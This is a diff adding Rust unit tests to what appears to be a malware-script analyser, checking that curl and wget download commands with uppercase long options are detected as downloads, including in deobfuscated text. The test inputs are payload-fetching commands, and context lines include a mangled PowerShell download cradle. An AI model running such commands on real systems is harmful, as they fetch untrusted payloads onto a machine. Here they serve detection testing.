@@ -6748,6 +6748,32 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_attached_long_options_are_case_insensitive() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --URL=https://curl-upper-url.example/payload.bin --OUTPUT=C:\Temp\upper.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-upper-url.example/payload.bin",
+                Some(r#"C:\Temp\upper.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_short_o_glued_records_destination() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -6856,6 +6882,32 @@ mod wget_tests {
         assert!(env
             .modified_filesystem
             .contains_key(r#"c:\temp\payload.bin"#));
+    }
+
+    #[test]
+    fn wget_attached_long_output_option_is_case_insensitive() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget --OUTPUT-DOCUMENT=C:\Temp\upper.bin https://wget-upper-output.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-upper-output.example/payload.bin",
+                Some(r#"C:\Temp\upper.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -13846,6 +13898,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn curl_attached_long_options_case_insensitive_in_deob_text() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --URL=https://curl-upper-url-deob.example/payload.bin --OUTPUT=C:\Temp\upper.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-upper-url-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\upper.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl attached uppercase long options not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_short_o_glued_in_deob_text_emits_clean_destination() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -14152,6 +14225,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert_eq!(
             generic_count, 0,
             "wget --output-document URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_attached_long_output_option_case_insensitive_in_deob_text() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --OUTPUT-DOCUMENT=C:\Temp\upper.bin https://wget-upper-output-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-upper-output-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\upper.bin")
+            )
+        });
+        assert!(
+            has,
+            "wget uppercase attached --output-document not recovered: {:?}",
             env.traits
         );
     }
